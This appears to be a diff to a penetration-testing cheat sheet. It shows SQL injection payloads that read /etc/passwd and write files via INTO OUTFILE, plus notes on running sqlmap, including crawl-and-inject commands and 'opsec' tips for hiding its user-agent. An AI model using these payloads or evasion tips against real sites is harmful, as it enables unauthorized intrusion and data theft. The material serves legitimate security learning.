@@ -445,3 +445,37 @@ AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' 
 1 union select 'foo' into outfile '/tmp/foo'
 1 union select load_file('/etc/passwd')
 ```
+
+### SQLMap
+
+* The best tool out there for automating SQLi&#x20;
+* Can be used with Zap or Burp as a proxy, standalone, or fed a request from Zap or Burp
+
+#### Useful Automation Flags
+
+* In order to not have to answer its prompts, append `--batch`&#x20;
+* To put sqlmap in easy mode append `--wizard`
+
+#### Opsec
+
+* sqlmap uses `sqlmap` as its default user-agent, this is clearly not idea for anything that is not Hack The Box
+* `--mobile` Imitate smartphone through HTTP User-Agent header&#x20;
+* `--random-agent` Use randomly selected HTTP User-Agent header value
+* `--user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"` To use a specific user agent
+* Sqlmap also has a risk and level value to control the thoroughness of its tests
+
+```
+--level=5 #most amount of tests, options are 1-5
+--risk=3 #most risky, options are 1-3
+```
+
+#### Standalone Version
+
+* Sqlmap will need to identify the injection points on the site&#x20;
+
+```
+sqlmap -u "http://sqli.org/" --forms --crawl=2
+```
+
+* This will allow it to spider the page at a depth of two and attempt injection on any identified injection points
+*
